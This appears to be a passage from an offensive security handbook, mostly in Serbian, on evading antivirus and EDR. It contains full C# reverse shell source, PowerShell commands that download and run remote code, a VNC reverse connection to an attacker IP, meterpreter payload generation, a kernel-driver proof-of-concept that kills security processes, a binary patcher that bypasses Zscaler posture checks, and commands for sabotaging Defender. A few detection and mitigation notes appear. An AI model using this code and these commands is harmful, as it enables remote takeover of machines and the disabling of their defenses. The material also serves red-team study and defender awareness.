Radi se o ubacivanju post-exploitation zlonamernog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je što ako nešto pođe po zlu pri izvršavanju vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer može doći do pada.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **from PowerShell**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod koristeći druge jezike tako što kompromitovanom računaru omogućite pristup **interpreter environment instaliranom na SMB share-u koji kontroliše napadač**.

Dozvoljavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **execute arbitrary code in these languages within memory** kompromitovanog računara.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statičke potpise**. Testiranje sa nasumičnim ne-obfuskiranim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.

## TokenStomping

Token stomping je tehnika koja napadaču omogućava da **manipuliše pristupnim tokenom ili sigurnosnim proizvodom kao što su EDR ili AV**, omogućavajući im da smanje privilegije tako da proces neće prestati da radi, ali neće imati dozvole da proverava zlonamerne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **sprečiti spoljne procese** da dobiju handle-e nad tokenima sigurnosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je deploy-ovati Chrome Remote Desktop na žrtvin PC i koristiti ga za takeover i održavanje persistencije:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", i zatim kliknite na MSI fajl za Windows da preuzmete MSI fajl.
2. Pokrenite instalaciju tiho na žrtvinom računaru (potrebne administratorske privilegije): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Wizard će zatim tražiti autorizaciju; kliknite Authorize dugme da nastavite.
4. Izvršite dati parametar uz neke prilagodbe: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: pin param omogućava postavljanje pina bez upotrebe GUI-a).

## Advanced Evasion

Evasion je vrlo komplikovana tema, ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neprimećen u zrelim okruženjima.

Svako okruženje protiv kojeg idete ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), da dobijete uvod u naprednije tehnike evasion-a.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **otkrije koji deo Defender** smatra zlonamernim i podeli vam to.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web uslugom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) tako da:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (trebate bin preuzimanja, ne setup)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim, premestite binarni fajl _**winvnc.exe**_ i **novo** kreirani fajl _**UltraVNC.ini**_ unutar **victim**

#### **Reverse connection**

**attacker** treba da na svom **host** pokrene binarni fajl `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da uhvati reverse **VNC connection**. Zatim, unutar **victim**: pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

UPOZORENJE: Da biste održali stealth, ne smete uraditi sledeće

- Ne pokrećite `winvnc` ako već radi ili ćete pokrenuti [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za pomoć ili ćete pokrenuti [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će proces vrlo brzo prekinuti.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python-a za build injectors primer:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre pokretanja ransomware-a. Alat donosi svoj **vulnerable ali *signed* driver** i zloupotrebljava ga za izdavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Key take-aways
1. **Signed driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani drajver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto drajver nosi važeći Microsoft potpis, on se učitava čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prvi red registruje drajver kao **kernel service** a drugi ga pokreće tako da `\\.\ServiceMouse` postaje dostupan iz user land-a.
3. **IOCTLs exposed by the driver**
| IOCTL code | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekinuti proizvoljan proces po PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Obriši proizvoljan fajl na disku |
| `0x990001D0` | Ukloni drajver i obriši servis |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD zaobilazi user-mode zaštite u potpunosti; kod koji se izvršava u kernelu može otvoriti *protected* procese, terminirati ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge mehanizme hardeninga.

Detection / Mitigation
• Omogućite Microsoft-ovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.  
• Pratite kreiranje novih *kernel* servisa i alarmirajte kada se drajver učita iz direktorijuma koji je world-writable ili kada nije prisutan na allow-listi.  
• Pratite user-mode handle-ove ka custom device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da prenese rezultate ostalim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuni bypass:

1. Evaluacija posture se dešava **u potpunosti na klijentu** (serveru se šalje samo boolean).
2. Interni RPC endpoint-i samo verifikuju da je izvršni fajl **potpisan od strane Zscaler-a** (putem `WinVerifyTrust`).

Patchovanjem četiri signed binarna fajla na disku obe mehanike mogu biti neutralisane:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i unsigned) proces može bind-ovati RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Preskočeno |

Izvod minimalnog patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i restartovanja service stack-a:

* **Svi** posture checkovi prikazuju **zeleno/usaglašeno**.
* Nesignirani ili izmenjeni binarni fajlovi mogu otvoriti named-pipe RPC endpoint-e (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako se isključivo klijentske odluke poverenja i jednostavne provere potpisa mogu zaobići sa nekoliko izmena na nivou bajta.

## Zloupotreba Protected Process Light (PPL) za modifikovanje AV/EDR koristeći LOLBINs

Protected Process Light (PPL) primenjuje hijerarhiju potpisivača/nivoa tako da samo procesi sa istim ili višim nivoom zaštite mogu međusobno da se modifikuju. Napadački gledano, ako možete legitimno pokrenuti PPL-om omogućeni binarni fajl i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logovanje) u ograničen, PPL-podržan primitiv za pisanje protiv zaštićenih direktorijuma koje koriste AV/EDR.

Šta omogućava da proces radi kao PPL
- Ciljni EXE (i sve učitane DLL-ove) moraju biti potpisani PPL-kompatibilnim EKU.
- Proces mora biti kreiran pomoću CreateProcess koristeći flagove: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarnog fajla (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware potpisivače, `PROTECTION_LEVEL_WINDOWS` za Windows potpisivače). Pogrešni nivoi će izazvati neuspeh prilikom kreiranja.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Open-source helper: CreateProcessAsPPL (izabere nivo zaštite i prosleđuje argumente ciljnome EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Primer upotrebe:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Beleške i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim lokacije; primitiv je pogodniji za korupciju nego za precizno ubacivanje sadržaja.
- Zahteva lokalnog admina/SYSTEM da instalira/pokrene servis i prozor za restart.
- Vreme je kritično: ciljna datoteka ne sme biti otvorena; izvršavanje pri boot-u izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, posebno ako mu je parent nestandardni pokretač, oko boot-a.
- Novi servisi konfigurisani da auto-startuju sumnjive binarije i dosledno se pokreću pre Defender/AV. Istražite kreiranje/izmenu servisa pre pojave grešaka pri pokretanju Defender-a.
- Nadzor integriteta fajlova nad Defender binarijima/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od procesa sa protected-process zastavicom.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od ne-AV binarija.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binariji mogu da rade kao PPL i pod kojim parent-ima; blokirajte pozivanje ClipUp-a van legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu auto-start servisa i pratite manipulacije redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch protections omogućeni; istražite greške pri pokretanju koje ukazuju na korupciju binarija.
- Razmislite o onemogućavanju 8.3 short-name generisanja na volumima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (temeljno testirati).

References for PPL and tooling
- Pregled Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Referenca za EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (verifikacija redosleda): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Sabotaža Microsoft Defender-a putem Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje se izvršava tako što nabraja podfoldere ispod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Izabere podfolder sa najvećim leksikografskim verzionim stringom (npr. `4.18.25070.5-0`), zatim pokreće Defender servisne procese odatle (i ažurira service/registry putanje u skladu). Ova selekcija veruje unosima direktorijuma uključujući directory reparse points (symlinks). Administrator može iskoristiti ovo da preusmeri Defender na putanju zapisivu od strane napadača i ostvari DLL sideloading ili disruption servisa.

Preconditions
- Lokalni administrator (potreban za kreiranje direktorijuma/symlink-ova u Platform folderu)
- Mogućnost restarta ili izazivanja re-selekcije Defender platforme (restart servisa pri boot-u)
- Potrebni samo ugrađeni alati (mklink)

Why it works
- Defender blokira upise u sopstvene foldere, ali njegov izbor platforme veruje unosima direktorijuma i bira leksikografski najveću verziju bez provere da li se cilj rešava na zaštićenu/pouzdanu putanju.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Napravite symlink direktorijuma sa višom verzijom unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučen reboot):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koja odražava tu lokaciju.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da pri narednom pokretanju konfigurisana putanja ne bude razrešena i Defender neće uspeti da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje eskalaciju privilegija; zahteva administrativna prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu premestiti runtime evasion iz C2 implant-a u sam ciljni modul tako što će hook-ovati njegov Import Address Table (IAT) i usmeriti odabrane API-je kroz attacker‑kontrolisani, position‑independent code (PIC). Ovo generalizuje evasion izvan malog API surface-a koji mnogi kitovi izlažu (npr. CreateProcessA), i proširuje iste zaštite na BOFs i post‑ex DLLs.

Visok nivo pristupa
- Stage‑ujte PIC blob pored ciljnog modula koristeći reflective loader (prepended ili companion). PIC mora biti samodovoljan i position‑independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patch-ujte IAT unose za ciljne importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava tehnike izbegavanja pre nego što tail‑pozove pravu adresu API‑a. Tipične tehnike izbegavanja uključuju:
  - Maskiranje/odmaskiranje memorije oko poziva (npr. encrypt beacon regions, RWX→RX, promena naziva/dozvola stranica) pa vraćanje nakon poziva.
  - Call‑stack spoofing: konstruisati benignu stek strukturu i preći u ciljnu API funkciju tako da analiza call‑stack‑a rezoluje u očekivane okvire.
- Za kompatibilnost, eksportujte interfejs tako da Aggressor script (ili ekvivalent) može registrovati koje API‑e hook‑ovati za Beacon, BOFs i post‑ex DLLs.

Why IAT hooking here
- Radi za bilo koji kod koji koristi hookovani import, bez modifikovanja koda alata ili oslanjanja na Beacon da proxy‑uje specifične API‑je.
- Pokriva post‑ex DLLs: hookovanje LoadLibrary* vam omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion na njihove API pozive.
- Vraća pouzdano korišćenje post‑ex komandi za pokretanje procesa protiv detekcija zasnovanih na call‑stack‑u tako što omota CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR i pre prvog korišćenja importa. Reflective loaders like TitanLdr/AceLdr demonstriraju hooking tokom DllMain učitanog modula.
- Drži wrapper-e male i PIC-safe; odredi pravu API preko originalne IAT vrednosti koju si uhvatio pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs prave lažni lanac poziva (return addresses u benignim modulima) a zatim prelaze na stvarni API.
- Ovo pobeđuje detekcije koje očekuju kanoničke stekove iz Beacon/BOFs do osetljivih API-ja.
- Poveži sa stack cutting/stack stitching techniques da bi dospeo unutar očekivanih frejmova pre API prologa.

Operativna integracija
- Dodaj reflective loader na početak post‑ex DLLs tako da se PIC i hooks inicijalizuju automatski kada se DLL učita.
- Koristi Aggressor script da registruje ciljne API-je tako da Beacon i BOFs transparentno imaju koristi od iste evasion path bez promena koda.

Detekcija/DFIR razmatranja
- IAT integrity: unosi koji rezolvuju na non‑image (heap/anon) adrese; periodična verifikacija import pointers.
- Stack anomalies: return addresses koji ne pripadaju učitanim image-ima; nagli prelazi na non‑image PIC; nekonzistentno RtlUserThreadStart poreklo.
- Loader telemetry: upisi u procesu u IAT, rana DllMain aktivnost koja menja import thunks, neočekivani RX regioni kreirani pri učitavanju.
- Image‑load evasion: ako hookuješ LoadLibrary*, monitoriši sumnjiva učitavanja automation/clr assemblies korelisana sa memory masking events.

Povezani gradivni blokovi i primeri
- Reflective loaders koji obavljaju IAT patching tokom učitavanja (npr., TitanLdr, AceLdr)
- Memory masking hooks (npr., simplehook) i stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (npr., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustruje kako moderni info-stealers mešaju AV bypass, anti-analysis i credential access u jedinstvenom workflow-u.

### Keyboard layout gating & sandbox delay

- Konfig flag (`anti_cis`) nabraja instalirane keyboard layouts preko `GetKeyboardLayoutList`. Ako se pronađe ćirilični layout, sample ostavlja prazan `CIS` marker i terminira pre pokretanja stealera, osiguravajući da nikada ne detonira na izuzetim lokalitetima dok ostavlja artifact za hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita logika `check_antivm`

- Variant A prolazi kroz listu procesa, hešira svaki naziv prilagođenim rolling checksum-om i upoređuje ga sa ugrađenim blocklistama za debuggers/sandboxes; ponavlja checksum preko imena računara i proverava radne direktorijume kao što je `C:\analysis`.
